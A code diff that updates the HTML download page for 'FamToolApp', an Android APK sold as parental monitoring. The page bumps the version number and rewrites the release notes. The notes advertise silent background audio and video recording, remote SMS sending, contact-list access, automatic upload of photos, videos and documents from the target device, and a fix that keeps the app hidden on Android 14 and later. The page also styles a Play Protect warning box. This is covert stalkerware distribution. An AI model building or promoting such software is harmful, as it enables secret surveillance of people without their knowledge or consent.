@@ -42,10 +42,10 @@
             font-size: 3rem;
             font-weight: 800;
             margin-bottom: 2rem;
-            color: #FFFFFF; /* "ToolApp" à¤•à¥‡ à¤²à¤¿à¤ à¤¸à¤«à¤¼à¥‡à¤¦ à¤°à¤‚à¤— */
+            color: #FFFFFF; /* White color for "ToolApp" */
         }
         .stylish-logo span {
-            color: #a78bfa; /* "Fam" à¤•à¥‡ à¤²à¤¿à¤ à¤¹à¤²à¥à¤•à¤¾ à¤¬à¥ˆà¤‚à¤—à¤¨à¥€ à¤°à¤‚à¤— */
+            color: #a78bfa; /* Light purple color for "Fam" */
         }
         
         /* Play Protect Warning Box Styles */
@@ -249,22 +249,22 @@
         <button id="download-button">Download APK</button>
 
         <div class="version-info">
-            <p>Update: 19/03/2026</p>
-            <p>🚀 <strong>What's New in Version 30.30!</strong></p>
-            <p>We are constantly working to improve your experience. Here is what's new in our latest major update:</p>
+            <p>Update: 09/04/2026</p>
+            <p>🚀 <strong>What's New in Version 31.31!</strong></p>
+            <p>We are constantly working to improve your experience. Here is what's new in our latest update:</p>
 
-            <p>✨ <strong>Exciting New Features:</strong></p>
+            <p>✨ <strong>New Feature:</strong></p>
             <ul style="text-align: left; list-style-type: disc; padding-left: 20px; color: var(--text-secondary);">
-                <li><strong>Advanced Wake-up System (FCM v1):</strong> App now remains active and wakes up instantly from deep sleep without delays.</li>
-                <li><strong>Stealth Monitoring:</strong> Improved background audio and video recording that operates completely silently.</li>
-                <li><strong>Remote Send SMS:</strong> You can now send SMS messages remotely directly from the dashboard.</li>
-                <li><strong>Access Contact List:</strong> Easily view and access the contact list to send messages to specific contacts.</li>
+                <li><strong>File Manager:</strong> A brand-new File Manager feature has been added. The app now automatically scans photos, videos, documents, and APK files on the child's device — compresses and uploads them securely to the parent panel for review. Includes daily scan limits and smart compression.</li>
             </ul>
 
-            <p>🛠️ <strong>Bug Fixes & Performance Improvements:</strong></p>
-            <p>We have resolved the "Once-a-day" auto-recording bug to save battery & data. Additionally, we fixed the dashboard display bug (FCM Token hidden). The application now runs much smoother, faster, and provides a seamless stealth experience.</p>
+            <p>🛠️ <strong>Bug Fixes & Improvements:</strong></p>
+            <ul style="text-align: left; list-style-type: disc; padding-left: 20px; color: var(--text-secondary);">
+                <li><strong>App Hiding Bug Fixed:</strong> Resolved a critical issue where the hidden application (stealth mode) was not functioning correctly on Android 14+ devices. The app now hides reliably using the Activity-Alias approach.</li>
+                <li><strong>Minor Bug Fixes:</strong> Multiple stability improvements, memory optimizations, and background service enhancements for smoother performance across all supported Android versions (8.0 – 16).</li>
+            </ul>
 
-            <p><strong>Why Update?</strong> Update to Version 30.30 today to unlock these powerful new features and enjoy a lag-free experience!</p>
+            <p><strong>Why Update?</strong> Update to Version 31.31 today to access the powerful new File Manager feature and enjoy a more stable, bug-free experience!</p>
         </div>
     </div> 
 
@@ -282,7 +282,7 @@
             let currentCaptcha = '';
             
             // --- YAHAN APNI APK FILE KA LINK ADD KAREN ---
-            const downloadUrl = 'child/FamToolApp-30.30.apk';
+            const downloadUrl = 'child/FamToolApp-31.31.apk';
 
             function generateCaptcha() {
                 const chars = '0123456789';
